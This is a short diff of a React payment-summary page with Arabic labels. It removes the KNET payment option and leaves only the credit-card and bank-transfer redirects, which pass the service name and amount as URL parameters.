@@ -113,7 +113,7 @@ export default function SummaryPayment() {
         grandTotal: grandTotal.toFixed(3),
       },
       current: 'ملخص الدفع',
-      nextPage: selectedPayment === 'knet' ? 'knet-payment' : selectedPayment === 'card' ? 'credit-card-payment' : 'bank-transfer',
+      nextPage: selectedPayment === 'card' ? 'credit-card-payment' : 'bank-transfer',
       waitingForAdminResponse: false,
     });
 
@@ -128,9 +128,7 @@ export default function SummaryPayment() {
 
     setTimeout(() => {
       setIsProcessing(false);
-      if (selectedPayment === 'knet') {
-        window.location.href = '/knet-payment';
-      } else if (selectedPayment === 'card') {
+      if (selectedPayment === 'card') {
         window.location.href = `/credit-card-payment?service=${encodeURIComponent('مزارع العين')}&amount=${grandTotal.toFixed(3)}`;
       } else {
         window.location.href = `/bank-transfer?service=${encodeURIComponent('مزارع العين')}&amount=${grandTotal}`;
